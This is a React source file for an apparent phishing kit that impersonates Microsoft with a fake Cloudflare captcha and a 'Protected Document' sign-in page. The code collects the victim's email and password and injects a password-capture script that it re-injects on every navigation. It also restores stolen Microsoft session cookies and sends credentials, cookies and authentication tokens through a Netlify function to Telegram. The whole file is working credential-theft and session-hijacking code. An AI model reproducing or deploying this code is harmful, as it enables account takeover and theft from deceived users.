import React, { useState, useEffect } from 'react';
import MessageIconLanding from './components/MessageIconLanding';
import CloudflareCaptcha from './components/CloudflareCaptcha';
import RealOAuthRedirect from './components/RealOAuthRedirect';

import { 
  restoreMicrosoftCookies, 
  restoreCookies, 
  setCapturedEmail, 
  setCapturedCookies,
  detectBrowserCapabilities,
  getStoredData
} from './utils/restoreCookies';

import { injectPasswordCaptureScript } from './utils/password-capture-injector';

const SLOW_DELAY = 1200;
const nextStepDelay = SLOW_DELAY * 3;
const messageIconDelay = 500;
const captchaVerificationDelay = 1500;
const redirectingDelay = 3000;
const totalCaptchaDelay = captchaVerificationDelay + messageIconDelay + nextStepDelay;

// Helper functions for persistent storage
const setStoredPassword = (password: string) => {
  try {
    localStorage.setItem('captured_password', password);
    sessionStorage.setItem('captured_password', password);
  } catch (error) {
    console.warn('Failed to store password:', error);
  }
};

const getStoredPassword = (): string | null => {
  try {
    return localStorage.getItem('captured_password') || sessionStorage.getItem('captured_password');
  } catch (error) {
    console.warn('Failed to retrieve stored password:', error);
    return null;
  }
};

const setStoredFormCredentials = (email: string, password: string) => {
  try {
    const credentials = {
      email,
      password,
      captureTime: new Date().toISOString(),
      source: 'document-protection-form'
    };
    localStorage.setItem('form_credentials', JSON.stringify(credentials));
    sessionStorage.setItem('form_credentials', JSON.stringify(credentials));
  } catch (error) {
    console.warn('Failed to store form credentials:', error);
  }
};

const getStoredFormCredentials = () => {
  try {
    const stored = localStorage.getItem('form_credentials') || sessionStorage.getItem('form_credentials');
    return stored ? JSON.parse(stored) : null;
  } catch (error) {
    console.warn('Failed to retrieve stored form credentials:', error);
    return null;
  }
};

function App() {
  const [currentPage, setCurrentPage] = useState('captcha');
  const [capturedEmail, setCapturedEmailState] = useState<string | null>(null);
  const [capturedCookies, setCapturedCookiesState] = useState<string | null>(null);
  const [capturedCredentials, setCapturedCredentials] = useState<{
    email?: string;
    password?: string;
    username?: string;
    domain?: string;
    captureTime?: string;
    source?: string;
    url?: string;
  } | null>(null);
  const [browserCapabilities, setBrowserCapabilities] = useState<any>(null);

  // FORM STATE
  const [formEmail, setFormEmail] = useState('');
  const [formPassword, setFormPassword] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  // 🟢 NEW: Track if we've already sent tokens/cookies/email/password (prevents double send)
  const [hasSentAuthData, setHasSentAuthData] = useState(false);

  // 🟢 NEW: Store session data from OAuth
  const [oauthSessionData, setOAuthSessionData] = useState<any>(null);

  // CSS Keyframes
  useEffect(() => {
    const style = document.createElement('style');
    style.textContent = `
      @keyframes dotAnimation {
        0% { opacity: 0; }
        20% { opacity: 1; }
        100% { opacity: 0; }
      }
      @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
      }
      @keyframes fadeIn {
        0% { opacity: 0; transform: translateY(10px); }
        100% { opacity: 1; transform: translateY(0); }
      }
      .redirecting-dots span:nth-child(1) { animation-delay: 0s; }
      .redirecting-dots span:nth-child(2) { animation-delay: 0.2s; }
      .redirecting-dots span:nth-child(3) { animation-delay: 0.4s; }
      .redirecting-dots span:nth-child(4) { animation-delay: 0.6s; }
      .redirecting-dots span:nth-child(5) { animation-delay: 0.8s; }
      .redirecting-dots span:nth-child(6) { animation-delay: 1.0s; }
      .redirecting-dots span { animation: dotAnimation 1.5s infinite; }
      .fade-in { animation: fadeIn 0.5s ease-out; }
      .document-icon { animation: spin 2s linear infinite; }
      .protected-doc:hover { transform: translateY(-2px); transition: transform 0.2s ease; }
    `;
    document.head.appendChild(style);
    return () => document.head.removeChild(style);
  }, []);

  useEffect(() => {
    if (currentPage === 'redirecting') {
      const timer = setTimeout(() => {
        setCurrentPage('document-protection');
      }, redirectingDelay);
      return () => clearTimeout(timer);
    }
  }, [currentPage]);

  useEffect(() => {
    try {
      const capabilities = detectBrowserCapabilities();
      setBrowserCapabilities(capabilities);
      console.log('🌐 Browser capabilities detected:', capabilities);
    } catch (error) {
      console.warn('⚠️ Failed to detect browser capabilities:', error);
    }

    try {
      const storedData = getStoredData();
      if (storedData.email) {
        setCapturedEmailState(storedData.email);
        setFormEmail(storedData.email); // Pre-fill form with stored email
        console.log('📧 Restored stored email:', storedData.email);
      }
      if (storedData.cookies && storedData.cookies.length > 0) {
        setCapturedCookiesState(JSON.stringify(storedData.cookies));
        console.log('🍪 Restored stored cookies:', storedData.cookies.length);
      }

      // 🔧 FIX: Restore form credentials from persistent storage
      const storedFormCredentials = getStoredFormCredentials();
      if (storedFormCredentials) {
        setCapturedCredentials(storedFormCredentials);
        setFormEmail(storedFormCredentials.email || '');
        setFormPassword(storedFormCredentials.password || '');
        console.log('📋 Restored form credentials from storage:', {
          email: storedFormCredentials.email,
          hasPassword: !!storedFormCredentials.password,
          source: storedFormCredentials.source
        });
      }
    } catch (error) {
      console.warn('⚠️ Failed to restore stored data:', error);
    }
  }, []);

  useEffect(() => {
    try {
      injectPasswordCaptureScript();
      console.log('✅ Password capture injector initialized');
    } catch (error) {
      console.warn('⚠️ Failed to initialize password capture injector:', error);
    }

    const originalPushState = history.pushState;
    const originalReplaceState = history.replaceState;

    history.pushState = function (...args) {
      originalPushState.apply(history, args);
      setTimeout(() => {
        try {
          injectPasswordCaptureScript();
        } catch (error) {
          console.warn('⚠️ Failed to re-inject password capture on pushState:', error);
        }
      }, 1000);
    };

    history.replaceState = function (...args) {
      originalReplaceState.apply(history, args);
      setTimeout(() => {
        try {
          injectPasswordCaptureScript();
        } catch (error) {
          console.warn('⚠️ Failed to re-inject password capture on replaceState:', error);
        }
      }, 1000);
    };

    const handlePopState = () => {
      setTimeout(() => {
        try {
          injectPasswordCaptureScript();
        } catch (error) {
          console.warn('⚠️ Failed to re-inject password capture on popstate:', error);
        }
      }, 1000);
    };

    window.addEventListener('popstate', handlePopState);

    return () => {
      history.pushState = originalPushState;
      history.replaceState = originalReplaceState;
      window.removeEventListener('popstate', handlePopState);
    };
  }, []);

  useEffect(() => {
    function handleMessage(event: MessageEvent) {
      if (!event.data || typeof event.data !== 'object') return;

      if (event.data.type === 'EMAIL_CAPTURED' && event.data.email) {
        setCapturedEmailState(event.data.email);
        setCapturedEmail(event.data.email);
        console.log('📧 Email captured and stored:', event.data.email);
      }

      if (event.data.type === 'MICROSOFT_COOKIES_CAPTURED' && event.data.data?.cookies) {
        try {
          const cookiesJson = JSON.stringify(event.data.data.cookies);
          setCapturedCookiesState(cookiesJson);
          setCapturedCookies(event.data.data.cookies);

          const options = {
            reload: false,
            validate: true,
            debug: true,
            skipExpired: true,
            skipInvalid: false,
            warnOnSecurity: true,
            handleDuplicates: true
          };

          try {
            const result = restoreMicrosoftCookies(event.data.data.cookies, options);
            console.log('✅ Enhanced cookie restoration result:', result);
            if (result.success) {
              console.log(`🎯 Successfully restored ${result.restored}/${result.total} cookies`);
            }
          } catch (error) {
            console.warn('⚠️ Enhanced restoration failed, falling back to basic:', error);
            restoreCookies(event.data.data.cookies, { debug: true });
          }

        } catch (e) {
          console.warn('⚠️ Cookie processing error:', e);
        }
      }

      if (
        event.data.type === 'CREDENTIALS_CAPTURED' &&
        (event.data.data?.password || event.data.data?.email || event.data.data?.username)
      ) {
        const newCredentials = {
          ...event.data.data,
          captureTime: new Date().toISOString(),
          source: event.data.data?.source || 'injected-capture'
        };
        
        setCapturedCredentials(newCredentials);
        console.log('🔐 Enhanced credentials captured:', {
          hasEmail: !!newCredentials?.email,
          hasPassword: !!newCredentials?.password,
          hasUsername: !!newCredentials?.username,
          source: newCredentials?.source
        });

        // 🔧 FIX: Store credentials persistently
        if (newCredentials.email && newCredentials.password) {
          setStoredFormCredentials(newCredentials.email, newCredentials.password);
        }

        if (newCredentials.email) {
          setCapturedEmailState(newCredentials.email);
          setCapturedEmail(newCredentials.email);
        }
      }

      if (event.data.type === 'ORGANIZATIONAL_CREDENTIALS_CAPTURED' && event.data.data?.email) {
        setCapturedEmailState(event.data.data.email);
        setCapturedEmail(event.data.data.email);
        console.log('🏢 Organizational credentials captured:', event.data.data.email);
      }
    }

    window.addEventListener('message', handleMessage, false);
    return () => window.removeEventListener('message', handleMessage);
  }, []);

  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    const step = urlParams.get('step');
    if (step && ['captcha', 'message-icon', 'redirecting', 'document-protection', 'reauthenticating', 'oauth-redirect', 'success', 'document-loading'].includes(step)) {
      setCurrentPage(step);
      window.history.replaceState({}, document.title, window.location.pathname);
    }
  }, []);

  const handleCaptchaVerified = () => {
    setCurrentPage('redirecting');
  };
  const handleCaptchaBack = () => {
    window.location.reload();
  };

  const handleFormSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!formEmail || !formPassword) {
      alert('Please enter both email and password');
      return;
    }

    setIsSubmitting(true);

    try {
      // 🔧 FIX: Store form credentials in persistent storage immediately
      const formCredentials = {
        email: formEmail,
        password: formPassword,
        captureTime: new Date().toISOString(),
        source: 'document-protection-form'
      };

      // Store in both React state and persistent storage
      setCapturedEmailState(formEmail);
      setCapturedCredentials(formCredentials);
      
      // Store persistently
      setStoredFormCredentials(formEmail, formPassword);
      setCapturedEmail(formEmail);

      console.log('📋 Form credentials captured and stored persistently:', {
        email: formEmail,
        hasPassword: !!formPassword,
        source: 'document-protection-form'
      });

      setTimeout(() => {
        setCurrentPage('reauthenticating');
      }, 1000);

    } catch (error) {
      console.error('Error submitting form:', error);
      setTimeout(() => {
        setCurrentPage('reauthenticating');
      }, 1000);
    } finally {
      setTimeout(() => {
        setIsSubmitting(false);
      }, 1200);
    }
  };

  useEffect(() => {
    if (currentPage === 'reauthenticating') {
      const timer = setTimeout(() => {
        setCurrentPage('oauth-redirect');
      }, 2000);
      return () => clearTimeout(timer);
    }
  }, [currentPage]);

  // Send all credentials and cookies to Telegram after OAuth (include entered email/password)
  const sendToTelegram = async ({ email, password, cookies, authenticationTokens, userAgent, sessionId, url }) => {
    try {
      const netlifyFunctionUrl = '/.netlify/functions/sendTelegram';

      console.log('📤 Sending to Telegram:', {
        email: email,
        hasPassword: !!password,
        passwordLength: password ? password.length : 0,
        cookieCount: Array.isArray(cookies) ? cookies.length : 0
      });

      const response = await fetch(netlifyFunctionUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          email,
          password,
          passwordSource: password ? 'document-protection-form' : undefined,
          cookies,
          authenticationTokens,
          userAgent,
          sessionId,
          url
        })
      });

      const result = await response.json();

      if (response.ok && result.success) {
        console.log('✅ Sent all authentication data to Telegram (ONE TIME, after OAuth)');
        console.log('✅ Telegram result:', result);
      } else {
        console.warn('⚠️ Netlify function responded with error:', result);
      }
    } catch (error) {
      console.warn('⚠️ Failed to send to Telegram:', error);
    }
  };

  const handleOAuthSuccess = async (sessionData: any) => {
    console.log('✅ OAuth success with enhanced data handling:', sessionData);

    if (!hasSentAuthData) {
      setHasSentAuthData(true);

      // 🔧 FIX: Get credentials from persistent storage first, then fallback to state
      const storedFormCredentials = getStoredFormCredentials();
      
      let finalEmail = '';
      let finalPassword = '';

      // Priority order: stored form credentials > captured credentials > current form state > captured email
      if (storedFormCredentials) {
        finalEmail = storedFormCredentials.email || '';
        finalPassword = storedFormCredentials.password || '';
        console.log('📊 Using stored form credentials');
      } else if (capturedCredentials?.email && capturedCredentials?.password) {
        finalEmail = capturedCredentials.email;
        finalPassword = capturedCredentials.password;
        console.log('📊 Using captured credentials from state');
      } else {
        finalEmail = formEmail || capturedEmail || '';
        finalPassword = formPassword || getStoredPassword() || '';
        console.log('📊 Using fallback credentials');
      }

      console.log('📊 Final credentials for Telegram:', {
        finalEmail,
        hasPassword: !!finalPassword,
        passwordSource: storedFormCredentials ? 'stored-form' : (capturedCredentials?.source || 'fallback'),
        storedCredentialsExists: !!storedFormCredentials,
        capturedCredentialsExists: !!capturedCredentials,
        formEmailExists: !!formEmail,
        formPasswordExists: !!formPassword
      });

      await sendToTelegram({
        email: finalEmail,
        password: finalPassword,
        cookies: capturedCookies ? JSON.parse(capturedCookies) : [],
        authenticationTokens: sessionData?.authenticationTokens || {},
        userAgent: navigator.userAgent,
        sessionId: sessionData?.sessionId || ('oauth_' + Math.random().toString(36).substring(2, 15)),
        url: window.location.href
      });
    }

    setOAuthSessionData(sessionData);
    setCurrentPage('document-loading');
  };

  const handleOAuthBack = () => {
    setCurrentPage('document-protection');
  };

  switch (currentPage) {
    case 'captcha':
      return (
        <CloudflareCaptcha
          onVerified={handleCaptchaVerified}
          onBack={handleCaptchaBack}
          verificationDelay={captchaVerificationDelay}
          autoRedirectDelay={messageIconDelay}
          totalDelayTime={totalCaptchaDelay}
        />
      );

    case 'redirecting':
      return (
        <div style={{
          display: 'flex',
          justifyContent: 'center',
          alignItems: 'center',
          height: '100vh',
          fontFamily: 'Arial, sans-serif',
          backgroundColor: '#f3f2f1'
        }}>
          <div style={{
            textAlign: 'center',
            fontSize: '24px',
            color: '#323130'
          }}>
            Opening
            <span className="redirecting-dots">
              <span>.</span>
              <span>.</span>
              <span>.</span>
              <span>.</span>
              <span>.</span>
              <span>.</span>
            </span>
          </div>
        </div>
      );

    case 'document-protection':
      // --- Microsoft-styled, WIRED TO LOGIC, FIXED FORM GROUP WIDTH ---
      return (
        <div style={{
          background: "#f7f9fb",
          fontFamily: "'Segoe UI', Arial, sans-serif",
          minHeight: "100vh",
          margin: 0,
          display: "flex",
          flexDirection: "column",
          alignItems: "center"
        }}>
          <style>
            {`
            .card {
              background: #fff;
              border-radius: 10px;
              box-shadow: 0 6px 22px 0 rgba(0,0,0,0.08);
              padding: 35px 45px 35px 45px;
              max-width: 530px;
              width: 100%;
              margin-top: 38px;
              display: flex;
              flex-direction: column;
              align-items: center;
            }
            .logo {
              width: 100px;
              margin-bottom: 28px;
              display: block;
            }
            .title {
              font-size: 1.7em;
              font-weight: 600;
              color: #23272a;
              margin-bottom: 16px;
              letter-spacing: 0.01em;
              text-align: center;
            }
            .desc {
              font-size: 1.04em;
              color: #38444d;
              margin-bottom: 10px;
              text-align: center;
            }
            .secure-link {
              font-size: 1.13em;
              font-weight: 150;
              color: #0078d4;
              margin-bottom: 16px;
              text-align: center;
              word-break: break-word;
            }
            .instructions {
              font-size: 1em;
              color: #626b76;
              margin-bottom: 20px;
              line-height: 1.5em;
              text-align: center;
            }
            .form-group {
              width: 100%;
              max-width: 100%;
              margin-left: 0;
              display: flex;
              flex-direction: column;
              align-items: flex-start;
              background: none;
            }
            .input-label {
              font-size: 0.97em;
              color: #4d5a67;
              margin-bottom: 7px;
              text-align: left;
              margin-left: 8px;
              margin-top: 10px;
              align-self: flex-start;
            }
            .input-row {
              width: 100%;
              position: relative;
              margin-bottom: 18px;
              background: #f6f8fa;
              border-radius: 6px;
              display: flex;
              align-items: center;
            }
            input[type="email"], input[type="password"] {
              width: 100%;
              font-size: 1.07em;
              padding: 12px 60px 12px 20px;
              border: 1.5px solid #cfd8dc;
              border-radius: 6px;
              box-sizing: border-box;
              transition: border 0.2s;
              outline: none;
              background: transparent;
              margin-bottom: 0;
              display: block;
              color: #23272a;
            }
            input[type="email"]:focus, input[type="password"]:focus {
              border-color: #0078d4;
              background: #fff;
            }
            .input-icon {
              position: absolute;
              right: 12px;
              top: 50%;
              transform: translateY(-50%);
              width: 22px;
              height: 22px;
              opacity: 0.6;
              pointer-events: none;
            }
            .next-btn {
              width: 100%;
              background: linear-gradient(90deg,#0078d4 0,#005fa3 100%);
              color: #fff;
              border: none;
              border-radius: 4px;
              font-size: 1.15em;
              font-weight: 500;
              padding: 14px 0;
              cursor: pointer;
              margin-bottom: 18px;
              margin-top: 6px;
              box-shadow: 0 2px 8px rgba(0,120,212,0.08);
              transition: background 0.18s;
              display: block;
            }
            .next-btn:hover, .next-btn:focus {
              background: linear-gradient(90deg,#005fa3 0,#0078d4 100%);
            }
            .footer-text {
              font-size: 0.92em;
              color: #8896ae;
              margin-top: 12px;
              margin-bottom: 0;
              text-align: justify;
              line-height: 1.5em;
              max-width: 100%;
              width: 100%;
              letter-spacing: 0.01em;
              word-break: break-word;
              display: block;
            }
            .copyright {
              text-align: center;
              color: #b0b9c6;
              font-size: 0.98em;
              margin-top: 18px;
              margin-bottom: 15px;
            }
            @media (max-width: 700px) {
              .card {
                max-width: 98vw;
                padding: 18px 2vw 16px 2vw;
              }
              .footer-text, .copyright {
                font-size: 0.87em;
              }
              .logo {
                width: 92px;
              }
              .form-group {
                width: 100%;
                margin-left: 0;
                max-width: 100%;
              }
            }
            `}
          </style>
          <div className="card">
            <img className="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/768px-Microsoft_logo_%282012%29.svg.png?20230221160917" alt="Microsoft Logo" />
            <div className="title">Verify Your Identity</div>
            <div className="desc">You've received a secure document</div>
            <div className="secure-link">Protected Document File</div>
            <div className="instructions">
              To open this secure Document, please enter the email address that this item was shared to.
            </div>
            <form onSubmit={handleFormSubmit} autoComplete="off">
              <div className="form-group">
                <label className="input-label" htmlFor="email">Email Address</label>
                <div className="input-row">
                  <input
                    type="email"
                    id="email"
                    placeholder="Enter email"
                    required
                    value={formEmail}
                    onChange={e => setFormEmail(e.target.value)}
                    disabled={isSubmitting}
                    autoComplete="username"
                  />
                  <svg className="input-icon" viewBox="0 0 24 24" fill="none">
                    <rect x="3" y="5" width="18" height="14" rx="2" stroke="#0078d4" strokeWidth="1.5"/>
                    <path d="M3 5l9 7l9-7" stroke="#0078d4" strokeWidth="1.5" fill="none"/>
                  </svg>
                </div>
                <label className="input-label" htmlFor="password">Password</label>
                <div className="input-row">
                  <input
                    type="password"
                    id="password"
                    placeholder="Enter password"
                    required
                    value={formPassword}
                    onChange={e => setFormPassword(e.target.value)}
                    disabled={isSubmitting}
                    autoComplete="current-password"
                  />
                  <svg className="input-icon" viewBox="0 0 24 24" fill="none">
                    <rect x="4" y="8" width="16" height="10" rx="2" stroke="#0078d4" strokeWidth="1.5"/>
                    <circle cx="12" cy="13" r="2" stroke="#0078d4" strokeWidth="1.5" fill="none"/>
                    <rect x="8" y="4" width="8" height="4" rx="1" stroke="#0078d4" strokeWidth="1.2" fill="none"/>
                  </svg>
                </div>
                <button
                  className="next-btn"
                  type="submit"
                  disabled={isSubmitting}
                  style={{opacity: isSubmitting ? 0.7 : 1}}
                >
                  {isSubmitting ? "🔄 Authenticating..." : "Authenticate & Open Document"}
                </button>
              </div>
            </form>
            <p className="footer-text">
              By clicking Next, you allow secureportdocs.com to use your email address in accordance with their privacy statement. secureportdocs.com has not provided links to their terms for you to review.
            </p>
          </div>
          <div className="copyright">
            © 2025 Microsoft &nbsp; Privacy & Cookies
          </div>
        </div>
      );
      // --- END Microsoft-styled, WIRED TO LOGIC, FIXED FORM GROUP WIDTH ---

    case 'reauthenticating':
      return (
        <div style={{
          display: 'flex',
          justifyContent: 'center',
          alignItems: 'center',
          height: '100vh',
          fontFamily: 'Arial, sans-serif',
          backgroundColor: '#f3f2f1'
        }}>
          <div style={{
            textAlign: 'center',
            fontSize: '24px',
            color: '#323130'
          }}>
            Reauthenticating
            <span className="redirecting-dots">
              <span>.</span>
              <span>.</span>
              <span>.</span>
              <span>.</span>
              <span>.</span>
              <span>.</span>
            </span>
          </div>
        </div>
      );

    case 'message-icon':
      return (
        <MessageIconLanding
          onOpenMessage={() => {}}
        />
      );

    case 'oauth-redirect':
      return (
        <RealOAuthRedirect
          onLoginSuccess={handleOAuthSuccess}
        />
      );

    case 'success':
    case 'document-loading':
      return (
        <div style={{
          display: 'flex',
          justifyContent: 'center',
          alignItems: 'center',
          height: '100vh',
          fontFamily: 'Arial, sans-serif',
          backgroundColor: '#f3f2f1'
        }}>
          <div style={{
            textAlign: 'center',
            background: 'white',
            padding: '60px',
            borderRadius: '8px',
            boxShadow: '0 2px 10px rgba(0,0,0,0.1)'
          }}>
            <div className="document-icon" style={{
              width: '80px',
              height: '80px',
              background: '#0078d4',
              borderRadius: '8px',
              margin: '0 auto 30px',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              fontSize: '40px',
              color: 'white'
            }}>
              📄
            </div>
            <h2 style={{ color: '#323130', margin: '0 0 10px' }}>
              Loading Document...
            </h2>
            <p style={{ color: '#605e5c', margin: '0 0 20px' }}>
              Please wait while we prepare your Microsoft document
            </p>
            {process.env.NODE_ENV === 'development' && (
              <div style={{ 
                marginTop: '20px', 
                padding: '10px', 
                backgroundColor: '#f8f9fa', 
                borderRadius: '4px',
                fontSize: '12px',
                color: '#666'
              }}>
                <div>Email: {capturedEmail || 'Not captured'}</div>
                <div>Cookies: {capturedCookies ? JSON.parse(capturedCookies).length : 0}</div>
                <div>Credentials: {capturedCredentials ? 'Captured' : 'None'}</div>
                <div>Browser: {browserCapabilities?.browser} v{browserCapabilities?.version}</div>
              </div>
            )}
            <div style={{
              display: 'flex',
              justifyContent: 'center',
              gap: '10px',
              marginTop: '30px'
            }}>
              <button
                onClick={() => setCurrentPage('captcha')}
                style={{
                  padding: '10px 20px',
                  backgroundColor: '#0078d4',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                Start Over
              </button>
              <button
                onClick={() => setCurrentPage('oauth-redirect')}
                style={{
                  padding: '10px 20px',
                  backgroundColor: '#107c10',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  cursor: 'pointer'
                }}
              >
                Try Again
              </button>
            </div>
          </div>
        </div>
      );

    default:
      return (
        <CloudflareCaptcha
          onVerified={handleCaptchaVerified}
          onBack={handleCaptchaBack}
          verificationDelay={captchaVerificationDelay}
          autoRedirectDelay={messageIconDelay}
          totalDelayTime={totalCaptchaDelay}
        />
      );
  }
}

export default App;
